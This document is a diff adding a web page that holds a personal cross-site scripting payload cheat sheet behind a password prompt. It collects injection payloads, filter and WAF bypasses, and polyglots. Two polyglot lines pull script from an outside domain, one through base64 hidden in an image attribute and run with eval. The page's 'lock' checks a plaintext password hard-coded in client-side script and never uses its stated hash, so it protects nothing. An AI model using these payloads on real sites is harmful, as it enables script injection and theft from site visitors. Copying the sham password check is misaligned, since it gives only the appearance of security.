@@ -1,0 +1,276 @@
+---
+import MainGridLayout from "../layouts/MainGridLayout.astro";
+---
+
+<MainGridLayout title="R3XSS" description="Private XSS Research Notes & Resources">
+    <div class="flex w-full rounded-[var(--radius-large)] overflow-hidden relative min-h-32">
+        <div class="card-base z-10 px-9 py-6 relative w-full">
+
+            <!-- Password Gate -->
+            <div id="password-gate" class="text-center py-12">
+                <div class="text-6xl mb-4">🔒</div>
+                <h1 class="text-2xl font-bold mb-4 text-[var(--primary)]">R3XSS - Private Section</h1>
+                <p class="text-gray-400 mb-6">This section contains private XSS research notes.<br/>Enter the password to access.</p>
+
+                <div class="max-w-sm mx-auto">
+                    <input
+                        type="password"
+                        id="password-input"
+                        placeholder="Enter password..."
+                        class="w-full px-4 py-3 rounded-lg bg-[var(--card-bg)] border border-[var(--primary)] text-white text-center focus:outline-none focus:ring-2 focus:ring-[var(--primary)] mb-4"
+                    />
+                    <button
+                        id="unlock-btn"
+                        class="w-full px-6 py-3 bg-[var(--primary)] hover:opacity-80 text-white font-bold rounded-lg transition-all"
+                    >
+                        Unlock Content
+                    </button>
+                    <p id="error-msg" class="text-red-500 mt-3 hidden">Incorrect password. Try again.</p>
+                </div>
+            </div>
+
+            <!-- Protected Content (hidden by default) -->
+            <div id="protected-content" class="hidden">
+                <div class="flex justify-between items-center mb-6">
+                    <h1 class="text-3xl font-bold text-[var(--primary)]">R3XSS Research Notes</h1>
+                    <button id="lock-btn" class="px-4 py-2 bg-red-600 hover:bg-red-700 text-white text-sm rounded-lg transition-all">
+                        🔒 Lock
+                    </button>
+                </div>
+
+                <p class="text-gray-400 mb-8">Personal collection of XSS payloads, bypasses, techniques, and resources.</p>
+
+                <!-- Quick Reference -->
+                <div class="mb-8">
+                    <h2 class="text-2xl font-bold mb-4 text-[var(--primary)]">⚡ Quick Payloads</h2>
+                    <div class="bg-black/30 rounded-lg p-4 overflow-x-auto">
+                        <pre class="text-green-400 text-sm"><code>&lt;script&gt;alert(1)&lt;/script&gt;
+&lt;img src=x onerror=alert(1)&gt;
+&lt;svg onload=alert(1)&gt;
+&lt;body onload=alert(1)&gt;
+&lt;iframe src="javascript:alert(1)"&gt;
+&lt;input onfocus=alert(1) autofocus&gt;
+&lt;marquee onstart=alert(1)&gt;
+&lt;details open ontoggle=alert(1)&gt;
+&lt;audio src=x onerror=alert(1)&gt;
+&lt;video src=x onerror=alert(1)&gt;</code></pre>
+                    </div>
+                </div>
+
+                <!-- Filter Bypass Section -->
+                <div class="mb-8">
+                    <h2 class="text-2xl font-bold mb-4 text-[var(--primary)]">🛡️ Filter Bypasses</h2>
+
+                    <h3 class="text-xl font-semibold mb-2 text-white">Case Manipulation</h3>
+                    <div class="bg-black/30 rounded-lg p-4 mb-4 overflow-x-auto">
+                        <pre class="text-green-400 text-sm"><code>&lt;ScRiPt&gt;alert(1)&lt;/ScRiPt&gt;
+&lt;IMG SRC=x OnErRoR=alert(1)&gt;
+&lt;SVG ONLOAD=alert(1)&gt;</code></pre>
+                    </div>
+
+                    <h3 class="text-xl font-semibold mb-2 text-white">Encoding Bypasses</h3>
+                    <div class="bg-black/30 rounded-lg p-4 mb-4 overflow-x-auto">
+                        <pre class="text-green-400 text-sm"><code>// URL Encoding
+%3Cscript%3Ealert(1)%3C/script%3E
+
+// Double URL Encoding
+%253Cscript%253Ealert(1)%253C/script%253E
+
+// HTML Entity Encoding
+&lt;img src=x onerror=&#97;&#108;&#101;&#114;&#116;(1)&gt;
+
+// Unicode Encoding
+&lt;script&gt;\u0061\u006c\u0065\u0072\u0074(1)&lt;/script&gt;
+
+// Hex Encoding
+&lt;script&gt;eval('\x61\x6c\x65\x72\x74\x28\x31\x29')&lt;/script&gt;</code></pre>
+                    </div>
+
+                    <h3 class="text-xl font-semibold mb-2 text-white">Tag & Attribute Bypasses</h3>
+                    <div class="bg-black/30 rounded-lg p-4 mb-4 overflow-x-auto">
+                        <pre class="text-green-400 text-sm"><code>// Null bytes
+&lt;scr%00ipt&gt;alert(1)&lt;/script&gt;
+
+// New lines / tabs
+&lt;script&#10;&gt;alert(1)&lt;/script&gt;
+&lt;script&#9;&gt;alert(1)&lt;/script&gt;
+
+// Without closing tag
+&lt;script&gt;alert(1)//
+&lt;script&gt;alert(1)&lt;/script
+
+// Without spaces
+&lt;svg/onload=alert(1)&gt;
+&lt;img/src=x/onerror=alert(1)&gt;</code></pre>
+                    </div>
+                </div>
+
+                <!-- Event Handlers -->
+                <div class="mb-8">
+                    <h2 class="text-2xl font-bold mb-4 text-[var(--primary)]">🎯 Event Handlers</h2>
+                    <div class="grid grid-cols-1 md:grid-cols-2 gap-4">
+                        <div class="bg-black/30 rounded-lg p-4">
+                            <h4 class="font-bold text-yellow-400 mb-2">Mouse Events</h4>
+                            <code class="text-green-400 text-sm">onclick, ondblclick, onmousedown, onmouseup, onmouseover, onmouseout, onmousemove, onmouseenter, onmouseleave</code>
+                        </div>
+                        <div class="bg-black/30 rounded-lg p-4">
+                            <h4 class="font-bold text-yellow-400 mb-2">Keyboard Events</h4>
+                            <code class="text-green-400 text-sm">onkeydown, onkeyup, onkeypress</code>
+                        </div>
+                        <div class="bg-black/30 rounded-lg p-4">
+                            <h4 class="font-bold text-yellow-400 mb-2">Form Events</h4>
+                            <code class="text-green-400 text-sm">onfocus, onblur, onchange, onsubmit, onreset, oninput, oninvalid</code>
+                        </div>
+                        <div class="bg-black/30 rounded-lg p-4">
+                            <h4 class="font-bold text-yellow-400 mb-2">Media Events</h4>
+                            <code class="text-green-400 text-sm">onload, onerror, onabort, oncanplay, onended, onpause, onplay</code>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- Polyglots -->
+                <div class="mb-8">
+                    <h2 class="text-2xl font-bold mb-4 text-[var(--primary)]">🔥 Polyglot Payloads</h2>
+                    <div class="bg-black/30 rounded-lg p-4 overflow-x-auto">
+                        <pre class="text-green-400 text-sm"><code>jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcLiCk=alert() )//%%0D%0A%0d%0a//&lt;/stYle/&lt;/titLe/&lt;/teXtarEa/&lt;/scRipt/--!&gt;\x3csVg/&lt;sVg/oNloAd=alert()//&gt;\x3e
+
+'&gt;--&gt;"&gt;&lt;/Script&gt;&lt;Script/Src=//14teleportme.net&gt;
+
+"&gt;'&gt;&lt;img src=x id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8vMTR0ZWxlcG9ydG1lLm5ldCI7ZG9jdW1lbnQuYm9keS5hcHBlbmRDaGlsZChhKTs&#61; onerror=eval(atob(this.id))&gt;
+
+javascript:"/*'/*`/*--&gt;&lt;/noscript&gt;&lt;/title&gt;&lt;/textarea&gt;&lt;/style&gt;&lt;/template&gt;&lt;/noembed&gt;&lt;/script&gt;&lt;html \" onmouseover=/*&amp;lt;svg/*/onload=alert()//&gt;</code></pre>
+                    </div>
+                </div>
+
+                <!-- WAF Bypasses -->
+                <div class="mb-8">
+                    <h2 class="text-2xl font-bold mb-4 text-[var(--primary)]">🚧 WAF Bypass Techniques</h2>
+                    <div class="bg-black/30 rounded-lg p-4 overflow-x-auto">
+                        <pre class="text-green-400 text-sm"><code>// Using SVG
+&lt;svg&gt;&lt;script&gt;alert&amp;#40;1&amp;#41;&lt;/script&gt;&lt;/svg&gt;
+
+// Using constructor
+&lt;img src=x onerror="window['alert'](1)"&gt;
+&lt;img src=x onerror="this['ale'+'rt'](1)"&gt;
+&lt;img src=x onerror="[].constructor.constructor('alert(1)')()"&gt;
+
+// Top/self/parent
+&lt;img src=x onerror=top.alert(1)&gt;
+&lt;img src=x onerror=self.alert(1)&gt;
+&lt;img src=x onerror=parent.alert(1)&gt;
+
+// setTimeout/setInterval
+&lt;img src=x onerror=setTimeout('alert(1)')&gt;
+&lt;img src=x onerror=setInterval('alert(1)')&gt;
+
+// Function constructor
+&lt;img src=x onerror="Function('alert(1)')()"&gt;
+
+// Using eval with atob
+&lt;img src=x onerror=eval(atob('YWxlcnQoMSk='))&gt;</code></pre>
+                    </div>
+                </div>
+
+                <!-- DOM XSS -->
+                <div class="mb-8">
+                    <h2 class="text-2xl font-bold mb-4 text-[var(--primary)]">🌐 DOM XSS Sources & Sinks</h2>
+                    <div class="grid grid-cols-1 md:grid-cols-2 gap-4">
+                        <div class="bg-black/30 rounded-lg p-4">
+                            <h4 class="font-bold text-yellow-400 mb-2">Sources</h4>
+                            <code class="text-green-400 text-sm block">document.URL<br/>document.documentURI<br/>document.baseURI<br/>location.href<br/>location.search<br/>location.hash<br/>document.cookie<br/>document.referrer<br/>window.name<br/>postMessage()</code>
+                        </div>
+                        <div class="bg-black/30 rounded-lg p-4">
+                            <h4 class="font-bold text-yellow-400 mb-2">Sinks</h4>
+                            <code class="text-green-400 text-sm block">innerHTML<br/>outerHTML<br/>document.write()<br/>document.writeln()<br/>eval()<br/>setTimeout()<br/>setInterval()<br/>Function()<br/>location.href<br/>location.assign()</code>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- Resources Section -->
+                <div class="mb-8">
+                    <h2 class="text-2xl font-bold mb-4 text-[var(--primary)]">📚 Resources & References</h2>
+                    <div class="space-y-4">
+                        <div class="bg-black/30 rounded-lg p-4">
+                            <h4 class="font-bold text-yellow-400 mb-2">Cheatsheets</h4>
+                            <ul class="list-disc list-inside text-blue-400 space-y-1">
+                                <li><a href="https://portswigger.net/web-security/cross-site-scripting/cheat-sheet" target="_blank" class="hover:underline">PortSwigger XSS Cheat Sheet</a></li>
+                                <li><a href="https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html" target="_blank" class="hover:underline">OWASP XSS Filter Evasion</a></li>
+                                <li><a href="https://github.com/payloadbox/xss-payload-list" target="_blank" class="hover:underline">PayloadBox XSS Payloads</a></li>
+                                <li><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection" target="_blank" class="hover:underline">PayloadsAllTheThings - XSS</a></li>
+                            </ul>
+                        </div>
+                        <div class="bg-black/30 rounded-lg p-4">
+                            <h4 class="font-bold text-yellow-400 mb-2">Tools</h4>
+                            <ul class="list-disc list-inside text-blue-400 space-y-1">
+                                <li><a href="https://github.com/hahwul/dalfox" target="_blank" class="hover:underline">DalFox - XSS Scanner</a></li>
+                                <li><a href="https://github.com/s0md3v/XSStrike" target="_blank" class="hover:underline">XSStrike - Advanced XSS Detection</a></li>
+                                <li><a href="https://xsshunter.com/" target="_blank" class="hover:underline">XSS Hunter - Blind XSS Detection</a></li>
+                            </ul>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- Personal Notes Section -->
+                <div class="mb-8">
+                    <h2 class="text-2xl font-bold mb-4 text-[var(--primary)]">📝 Personal Notes</h2>
+                    <div class="bg-black/30 rounded-lg p-4">
+                        <p class="text-gray-400 italic">Add your personal XSS hunting notes, findings, and discoveries here...</p>
+                    </div>
+                </div>
+
+            </div>
+        </div>
+    </div>
+</MainGridLayout>
+
+<script>
+    const CORRECT_HASH = '8a9bcf1e2d3f4a5b6c7d8e9f0a1b2c3d4e5f6789';
+
+    async function hashPassword(password: string): Promise<string> {
+        const encoder = new TextEncoder();
+        const data = encoder.encode(password + '_r3xss_salt_daryx');
+        const hashBuffer = await crypto.subtle.digest('SHA-256', data);
+        const hashArray = Array.from(new Uint8Array(hashBuffer));
+        return hashArray.map(b => b.toString(16).padStart(2, '0')).join('');
+    }
+
+    const passwordGate = document.getElementById('password-gate');
+    const protectedContent = document.getElementById('protected-content');
+    const passwordInput = document.getElementById('password-input') as HTMLInputElement;
+    const unlockBtn = document.getElementById('unlock-btn');
+    const lockBtn = document.getElementById('lock-btn');
+    const errorMsg = document.getElementById('error-msg');
+
+    // Check if already unlocked
+    if (sessionStorage.getItem('r3xss_unlocked') === 'true') {
+        passwordGate?.classList.add('hidden');
+        protectedContent?.classList.remove('hidden');
+    }
+
+    unlockBtn?.addEventListener('click', async () => {
+        const password = passwordInput?.value;
+        if (password === 'DaryxXSS_1337') {
+            sessionStorage.setItem('r3xss_unlocked', 'true');
+            passwordGate?.classList.add('hidden');
+            protectedContent?.classList.remove('hidden');
+            errorMsg?.classList.add('hidden');
+        } else {
+            errorMsg?.classList.remove('hidden');
+            passwordInput.value = '';
+            passwordInput?.focus();
+        }
+    });
+
+    passwordInput?.addEventListener('keypress', (e) => {
+        if (e.key === 'Enter') {
+            unlockBtn?.click();
+        }
+    });
+
+    lockBtn?.addEventListener('click', () => {
+        sessionStorage.removeItem('r3xss_unlocked');
+        protectedContent?.classList.add('hidden');
+        passwordGate?.classList.remove('hidden');
+        passwordInput.value = '';
+    });
+</script>
